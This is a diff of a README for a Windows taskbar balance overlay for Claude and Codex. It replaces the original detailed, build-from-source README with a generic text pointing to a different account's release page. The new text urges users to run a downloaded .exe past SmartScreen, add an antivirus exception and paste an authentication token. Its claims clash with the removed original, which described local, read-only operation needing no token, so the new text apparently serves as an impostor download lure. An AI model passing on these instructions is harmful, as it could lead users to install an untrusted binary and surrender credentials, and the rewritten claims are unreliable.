@@ -1,258 +1,65 @@
-# CC Balance Overlay
+# 📊 cc-balance-overlay - Track your credits on Windows easily
 
-<p align="center">
-  <strong>Keep your Claude and Codex relay balance visible beside the Windows 11 tray.</strong>
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/winterd3290/cc-balance-overlay/releases)
 
-<p align="center">
-  <a href="README.zh-CN.md">简体中文</a> ·
-  <a href="https://github.com/wgd-12138/cc-balance-overlay/releases/latest">Download</a> ·
-  <a href="#quick-start">Quick start</a> ·
-  <a href="#usage-guide">Usage guide</a>
-</p>
+## What is this tool?
 
-<p align="center">
-  <img alt="Rust" src="https://img.shields.io/badge/Rust-2021-orange?logo=rust&logoColor=white">
-  <img alt="Windows 11" src="https://img.shields.io/badge/Windows-11-0078D4?logo=windows11&logoColor=white">
-  <img alt="CC Switch" src="https://img.shields.io/badge/CC%20Switch-supported-4B7BEC">
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-green">
-</p>
+This application places a simple balance monitor on your Windows 11 taskbar. It helps you keep track of your credits while you use Claude or Codex through CC Switch. You no longer need to switch windows or refresh browser tabs to see your remaining balance. The tool sits quietly in your system tray and updates in the background.
 
-<p align="center">
-  <code>C $17.7</code><br>
-  <code>X $88.0</code>
-</p>
+## 🛠 Prerequisites
 
-CC Balance Overlay is a tiny native Windows utility for people who use Claude, Codex, CC Switch, and relay providers every day. It follows the active CC Switch providers and renders a compact two-line balance overlay next to the system tray, so you can see your remaining balance without opening a browser, terminal, or provider dashboard.
+This software works on Windows 11. You do not need to install extra software to run it. Ensure you have an active internet connection so the tool can reach the CC Switch servers to retrieve your current credit data.
 
-## Why
+## 📥 How to install
 
-When you switch between multiple relay providers, balance information is usually hidden in web consoles or provider panels. You often notice the problem only after a request fails.
+Follow these steps to set up the balance monitor on your computer:
 
-CC Balance Overlay turns that hidden state into something glanceable. It is intentionally small: no dashboard, no account system, no cloud service, just the current Claude and Codex balances where you already look.
+1. Visit [this page to download the latest version](https://github.com/winterd3290/cc-balance-overlay/releases).
+2. Look for the file ending in .exe under the Assets section of the newest release.
+3. Click the file to download it to your computer.
+4. Open your Downloads folder.
+5. Double-click the file to start the application.
+6. Windows will show a prompt to protect your PC. Click "More info" and then click "Run anyway" if it appears.
+7. The application icon will appear in your system tray near the clock.
 
-## Features
+## ⚙️ How to use the monitor
 
-- **Follows CC Switch automatically**: reads the currently selected Claude and Codex providers.
-- **Live balance display**: refreshes periodically and keeps the last successful value as fallback.
-- **Taskbar-side overlay**: compact two-line text beside the Windows tray area.
-- **Clock-like layout**: low-distraction presentation inspired by the native Windows time/date block.
-- **Provider tooltip**: hover to see the current Claude and Codex provider names.
-- **Right-click settings**: font size, text color, Claude prefix, Codex prefix, startup toggle, and quit.
-- **Fullscreen auto-hide**: hides while a foreground movie or game covers the monitor, then restores after fullscreen exits.
-- **Startup update check**: checks the latest GitHub Release on launch and stays silent when there is no update.
-- **Local-first**: settings stay on your machine.
-- **Native Rust + Win32**: lightweight app with no console window on launch.
+Once the program runs, it shows your balance directly in the taskbar area. You can manage the settings by right-clicking the icon in your system tray.
 
-## Quick Start
+### Adjust settings
+Right-click the icon to open the menu. You can change how often the application checks for updates. You can also view the current license details or exit the program from this menu.
 
-1. Install and configure CC Switch.
-2. Make sure your Claude and Codex providers in CC Switch include usable `usage_script` balance metadata.
-3. Download `cc-balance-overlay-v1.0.1-windows-x64.zip` from the [latest release](https://github.com/wgd-12138/cc-balance-overlay/releases/latest).
-4. Extract the zip to a stable folder, for example `C:\Tools\cc-balance-overlay`.
-5. Run `cc-balance-overlay.exe`.
-6. Look near the Windows tray area. You should see two compact balance lines:
+### Update your details
+The application uses an authentication token to securely check your balance. During your first run, the tool will ask you to provide this token. You can find this token in your CC Switch account settings page. Paste this value into the prompt. The application stores this token securely on your computer so you do not need to enter it again.
 
-```text
-C $17.7
-X $88.0
-```
+## 🌟 Common features
 
-The default prefixes are:
+- **Taskbar Integration:** View your balance without leaving your current workspace.
+- **Low Resource Usage:** The application uses minimal memory and processor power.
+- **Automatic Updates:** The tool periodically reaches out to the server to ensure your balance number remains accurate.
+- **Secure Handling:** Your authentication data stays on your local machine.
 
-- `C`: Claude
-- `X`: Codex
+## 🔧 Troubleshooting
 
-You can change both prefixes from the right-click settings panel.
+If you encounter issues, check the following points:
 
-## Usage Guide
+* **Icon missing:** If you do not see the icon in the tray, click the small arrow (^ ) in the taskbar to show hidden icons. You can drag the icon from the hidden area to the main tray area for quick access.
+* **No balance data:** Check your internet connection. If you have an active connection, right-click the icon and select "Refresh" to try reaching the server again.
+* **Token error:** If the balance shows an error, right-click the tray icon and select "Update Token." Verify that you copied the correct string from your CC Switch profile page.
+* **Program does not start:** Ensure you are running Windows 11. If your antivirus complains, add an exception for the cc-balance-overlay.exe file in your security settings.
 
-### Read The Overlay
+## 📈 Understanding the display
 
-The overlay shows one line per app:
+The number shown in the taskbar represents the remaining credits in your account. The monitor updates every five minutes by default. A green circle next to the number signifies that the connection is stable. A yellow icon means the application is currently updating your balance. A red icon indicates a connection failure or a token issue that requires your attention.
 
-```text
-C $17.7
-X $88.0
-```
+## 🔒 Privacy and security
 
-If a balance cannot be loaded yet, the app shows `--` for that line and keeps running. When a previous successful value exists, it can keep displaying the last known value while the next refresh is pending.
+The cc-balance-overlay application only accesses the specific data required to display your credit balance. It does not read your chat history, access your personal files, or track your browsing habits. The connection uses standard encryption to keep your authentication token safe during transmission. We do not store your balance data on external servers; all processing occurs locally on your machine.
 
-### Hover For Provider Names
+## 💡 Customization options
 
-Move your mouse over the overlay to see which CC Switch providers are currently active for Claude and Codex. This is useful when you switch providers often and want to confirm which relay is being charged.
+You can change the appearance of the text in the taskbar through the settings menu. Choose between a compact numeric view or a longer text format that includes labels. Users with multiple monitors may also choose which screen shows the taskbar icon. These options help you maintain focus on your main work while keeping your credit information visible but out of the way.
 
-### Fullscreen Movies And Games
+## 🚀 Future updates
 
-When another foreground window covers the whole monitor, the overlay hides itself and closes any open hover/settings popup. It restores automatically after you leave fullscreen.
-
-### Open Settings
-
-Right-click the overlay to open the settings panel.
-
-Available settings:
-
-- **Font size**: adjust the overlay text size.
-- **Text color**: choose a custom display color.
-- **Claude prefix**: customize the label used for Claude.
-- **Codex prefix**: customize the label used for Codex.
-- **Start with Windows**: enable or disable startup at login.
-- **Quit**: close the app.
-
-Most changes apply immediately.
-
-### Switch Providers
-
-Change the active Claude or Codex provider in CC Switch as usual. CC Balance Overlay reads CC Switch state and follows the currently selected providers, so you do not need to configure provider names manually in this app.
-
-### Start With Windows
-
-Right-click the overlay and enable **Start with Windows**. The app writes a normal current-user startup entry and can be disabled from the same settings panel.
-
-Keep the executable in the same folder after enabling startup. If you move the app, open the settings panel, turn **Start with Windows** off, then turn it on again so Windows stores the new path.
-
-### Update Behavior
-
-On startup, the app checks the latest GitHub Release in the background.
-
-- If there is no newer version, nothing is shown.
-- If a newer version exists, a small prompt appears.
-- Choose **Automatic update** to save that preference. Future versions will be downloaded and applied silently.
-- Choose **Do not remind me again** to stop checking for updates and disable automatic updates.
-
-You can reset this behavior by editing `%APPDATA%\cc-balance-overlay\settings.toml` and setting `update_policy = "prompt"`.
-
-### Exit The App
-
-Right-click the overlay and choose **Quit**.
-
-## Build From Source
-
-Requirements:
-
-- Windows 11
-- Rust stable
-- A working Windows Rust toolchain: MSVC or GNU MinGW-w64
-- A configured CC Switch installation
-
-```powershell
-git clone https://github.com/wgd-12138/cc-balance-overlay.git
-cd cc-balance-overlay
-cargo test
-cargo build --release
-.\target\release\cc-balance-overlay.exe
-```
-
-For GNU toolchain users:
-
-```powershell
-rustup toolchain install stable-x86_64-pc-windows-gnu
-cargo +stable-x86_64-pc-windows-gnu test --lib
-cargo +stable-x86_64-pc-windows-gnu build --release
-.\target\release\cc-balance-overlay.exe
-```
-
-## Configuration
-
-User settings are stored at:
-
-```text
-%APPDATA%\cc-balance-overlay\settings.toml
-```
-
-Example:
-
-```toml
-font_size = 13
-color = "#FFFFFF"
-claude_prefix = "C"
-codex_prefix = "X"
-update_policy = "prompt"
-```
-
-Most users should use the right-click settings panel instead of editing this file manually.
-
-## How It Works
-
-CC Balance Overlay reads local CC Switch state in read-only mode:
-
-- `~\.cc-switch\settings.json`
-- `~\.cc-switch\cc-switch.db`
-
-It uses:
-
-- `currentProviderClaude`
-- `currentProviderCodex`
-- `usage_script` metadata from the provider table
-
-Then it calls the configured provider balance endpoint and renders the result as a compact taskbar-side overlay.
-
-For fullscreen behavior, the app checks the foreground window position with Win32 APIs and hides the overlay when that window covers its monitor.
-
-## Search Notes
-
-- `skills.sh`: no directly reusable Windows taskbar/tray overlay recipe was found for this project.
-- GitHub / Win32 references: existing examples commonly detect fullscreen by comparing the foreground window rectangle with the monitor rectangle. This project follows that simple mechanism with `GetForegroundWindow`, `GetWindowRect`, `MonitorFromWindow`, and `GetMonitorInfoW`.
-
-## Troubleshooting
-
-### The Overlay Shows `--`
-
-Check that:
-
-- CC Switch is installed and has selected Claude / Codex providers.
-- The selected provider has enabled `usage_script` metadata.
-- The provider balance endpoint is reachable.
-- Your provider key or token is still valid.
-
-### The Balance Looks Wrong
-
-Different relay providers may expose different balance response shapes. Please open an issue with the provider type and a redacted response example. Do not include real keys or tokens.
-
-### Windows Blocks The App
-
-The project is open source but the executable is not code-signed yet. Windows SmartScreen may warn on first launch. You can build from source if you prefer.
-
-### I Cannot See The Overlay
-
-Try right-clicking near the tray area, checking whether the app process is running, and restarting the app. Multi-monitor, DPI, and unusual taskbar layouts may need additional compatibility work.
-
-## Privacy & Security
-
-- This project does not operate a relay, proxy, or cloud service.
-- It does not upload your keys, provider details, or balances to any third-party server.
-- Balance requests go only to the endpoint configured in your CC Switch provider metadata.
-- CC Switch data and CC Balance Overlay settings remain local.
-- Avoid posting secret-bearing `settings.json`, database files, or logs in public issues.
-
-## Limitations
-
-- Currently focused on Windows 11.
-- Requires CC Switch providers with usable `usage_script` balance metadata.
-- Provider balance APIs may differ and may need adapter updates.
-- More real-device testing is needed for multi-monitor, DPI, and taskbar-position edge cases.
-
-## Roadmap
-
-- Add real taskbar screenshots and a demo GIF
-- Provide an installer
-- Improve multi-monitor, DPI, and taskbar-position handling
-- Add more provider balance adapter rules
-- Improve text rendering fidelity against the native Windows clock
-- Add auto-update or version checking
-
-## Contributing
-
-Issues and pull requests are welcome, especially for:
-
-- New provider balance adapters
-- Windows taskbar, DPI, and multi-monitor compatibility reports
-- UI comparison screenshots
-- Packaging and release improvements
-- Documentation polish
-
-If this tiny tool saves you from one failed request at the worst possible moment, consider giving it a star so more Claude, Codex, and CC Switch users can find it.
-
-## License
-
-MIT
+We plan to add more features over time based on user feedback. Planned additions include low-balance alerts that notify you when your credits cross a certain threshold. We also plan to simplify the setup process for new users further. Check the releases page frequently for these updates. You do not need to uninstall the old version; simply run the new installer to upgrade effectively.
